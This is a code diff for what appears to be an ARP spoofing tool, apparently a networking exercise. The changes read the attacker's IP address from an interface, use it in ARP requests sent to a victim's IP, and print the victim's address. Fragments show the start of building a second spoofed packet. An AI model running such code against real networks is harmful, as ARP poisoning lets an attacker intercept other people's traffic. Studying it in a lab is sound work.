@@ -34,7 +34,6 @@ typedef struct Mac_add{
 } s_Mac_Add;
 
 // Attacker Mac Address
-
 s_Mac_Add getMacAddress(char* interface) {
 	int sock = socket(AF_INET, SOCK_DGRAM, 0);
 	if (sock == -1) {
@@ -59,6 +58,30 @@ s_Mac_Add getMacAddress(char* interface) {
 	return mac;
 }
 
+// Attacker IP Address
+uint32_t getIpAddress(char* interface) {
+	int sock = socket(AF_INET, SOCK_DGRAM, 0);
+	if (sock == -1) {
+		perror("socket");
+		exit(1);
+	}
+
+	struct ifreq ifr;
+	memset(&ifr, 0, sizeof(ifr));
+	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
+
+	if (ioctl(sock, SIOCGIFADDR, &ifr) == -1) {
+		perror("ioctl");
+		close(sock);
+		exit(1);
+	}
+
+	close(sock);
+
+	return ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr;
+}
+
+
 int main(int argc, char* argv[]) {
 	if (argc / 2 != 0 && argc < 4) {
 		usage();
@@ -66,6 +89,7 @@ int main(int argc, char* argv[]) {
 	}
 
 	s_Mac_Add atkr_mac = getMacAddress(argv[1]);
+	uint32_t atkr_ip = getIpAddress(argv[1]);
 
 	for (int i = 1; i <= (argc - 2) / 2; i++) {
 		char attacker_mac[18] = "";
@@ -92,7 +116,7 @@ int main(int argc, char* argv[]) {
 		packet.arp_.pln_ = Ip::SIZE;
 		packet.arp_.op_ = htons(ArpHdr::Request);
 		packet.arp_.smac_ = Mac(attacker_mac);
-		packet.arp_.sip_ = htonl(Ip("192.168.193.168"));
+		packet.arp_.sip_ = htonl(Ip(std::string(Ip(htonl(atkr_ip))).c_str()));
 		packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // Unknown MAC address
 		packet.arp_.tip_ = htonl(Ip(argv[2 * i])); // Victim's IP address
 
@@ -120,9 +144,14 @@ int main(int argc, char* argv[]) {
 
 			EthArpPacket* victim_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet_data));
 
+
 			if (victim_packet->arp_.sip_ == packet.arp_.tip_ && victim_packet->eth_.type_ == htons(EthHdr::Arp) && victim_packet->arp_.op_ == htons(ArpHdr::Reply)) {
 				Mac victim_mac = victim_packet->arp_.smac_;
 				printf("Victim's MAC address: %s", std::string(victim_mac).c_str());
+
+				// print ip of victim_packet
+				printf("Victim's IP address: %s\n", std::string(Ip(victim_packet->arp_.sip_)).c_str());
+
 
 				EthArpPacket packet2;
 
